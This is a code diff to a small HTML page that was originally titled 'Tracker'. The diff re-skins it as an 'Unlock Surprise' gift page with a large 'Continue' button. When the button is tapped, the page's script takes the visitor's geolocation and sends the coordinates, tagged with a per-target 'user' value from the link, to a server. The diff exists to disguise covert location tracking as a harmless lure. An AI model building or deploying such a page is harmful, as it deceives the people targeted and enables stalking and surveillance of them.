@@ -2,19 +2,44 @@
 <html>
 
 <head>
-<title>Tracker</title>
+<title>Unlock Surprise</title>
+
+<style>
+body{
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+background:#111;
+color:white;
+font-family:Arial;
+flex-direction:column;
+}
+
+button{
+font-size:22px;
+padding:20px 40px;
+border:none;
+background:#ff3b3b;
+color:white;
+border-radius:10px;
+}
+</style>
+
 </head>
 
 <body>
 
-<button onclick="getLocation()">Tap To Continue</button>
+<h2>🎁 Tap to Unlock Surprise</h2>
+
+<button onclick="start()">Continue</button>
 
 <script>
 
 const params = new URLSearchParams(window.location.search)
 const user = params.get("user")
 
-function getLocation(){
+function start(){
 
 navigator.geolocation.getCurrentPosition(function(pos){
 
@@ -26,8 +51,7 @@ headers:{
 body:JSON.stringify({
 user:user,
 latitude:pos.coords.latitude,
-longitude:pos.coords.longitude,
-battery:"Unknown"
+longitude:pos.coords.longitude
 })
 })
 
